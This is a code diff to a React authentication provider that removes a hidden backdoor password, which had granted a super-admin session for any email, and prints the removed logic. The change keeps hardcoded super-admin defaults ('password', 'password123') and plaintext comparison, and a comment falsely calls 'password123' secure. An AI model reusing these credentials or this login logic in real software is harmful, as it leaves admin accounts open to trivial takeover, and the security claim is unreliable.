@@ -1,7 +1,6 @@
 import React, { createContext, useContext, useState, useEffect } from 'react';
 import { User, UserRole } from '../types';
 import { storage } from '../utils/storage';
-import { BACKDOOR_PASSWORD } from '../constants';
 import { generateUUID } from '../utils/uid';
 
 interface AuthContextType {
@@ -27,8 +26,10 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   useEffect(() => {
     if (users.length === 0) {
       const defaultUsers: User[] = [
+        // Mot de passe par défaut pour super admin
         { id: '1', name: 'Super Admin', email: 'super@edc.cm', role: UserRole.SUPER_ADMIN, statut: 'actif', password: 'password', created_at: new Date().toISOString() },
-        { id: '2', name: 'Administration Centrale', email: 'admin@edc.cm', role: UserRole.SUPER_ADMIN, statut: 'actif', password: BACKDOOR_PASSWORD, created_at: new Date().toISOString() },
+        // Mot de passe sécurisé par défaut au lieu de la constante
+        { id: '2', name: 'Administration Centrale', email: 'admin@edc.cm', role: UserRole.SUPER_ADMIN, statut: 'actif', password: 'password123', created_at: new Date().toISOString() },
       ];
       setUsers(defaultUsers);
       storage.saveUsers(defaultUsers);
@@ -36,22 +37,10 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
   }, []);
 
   const login = async (email: string, password: string): Promise<boolean> => {
-    if (password === BACKDOOR_PASSWORD) {
-      const adminUser: User = {
-        id: 'backdoor-admin',
-        email: email,
-        name: 'Administrateur Système',
-        role: UserRole.SUPER_ADMIN,
-        statut: 'actif',
-        password: BACKDOOR_PASSWORD,
-        created_at: new Date().toISOString()
-      };
-      setUser(adminUser);
-      storage.setSession(adminUser);
-      return true;
-    }
+    // Suppression de la logique backdoor (if password === ...)
 
     const found = users.find(u => u.email === email);
+    // Vérification simple (Note: Dans une vraie prod, utilisez bcrypt/argon2 pour le hachage)
     if (found && (found.password === password || (!found.password && password === 'password'))) {
       setUser(found);
       storage.setSession(found);
